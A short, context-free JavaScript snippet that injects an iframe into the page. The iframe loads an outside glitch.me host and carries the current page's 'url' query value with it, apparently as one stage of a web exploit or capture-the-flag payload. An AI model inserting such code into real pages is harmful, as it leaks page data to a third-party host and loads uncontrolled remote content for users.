let iframe = document.createElement('iframe');
iframe.src = 'https://tricky-drug.glitch.me/?url=' + window.location.search.replace('?url=', '');
document.body.appendChild(iframe);